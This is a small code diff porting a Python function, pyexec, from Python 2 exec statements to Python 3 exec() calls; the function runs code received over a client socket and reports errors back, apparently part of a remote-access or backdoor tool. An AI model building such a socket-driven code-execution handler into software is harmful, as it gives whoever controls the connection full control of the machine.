@@ -84,14 +84,14 @@ def pyexec(DC,client_socket,pylib=False):
     response = ''
     if pylib:
         try:
-            exec DC
+            exec(DC)
         except Exception as e:
             YPNP = "[!] PYEXEC(): {}".format(str(e))
             D(client_socket,YPNP)
     else:
         with stdoutIO() as s:
             try:
-                exec DC
+                exec(DC)
             except Exception as e:
                 YPNP = "[!] PYEXEC(): {}".format(str(e))
                 D(client_socket,YPNP)
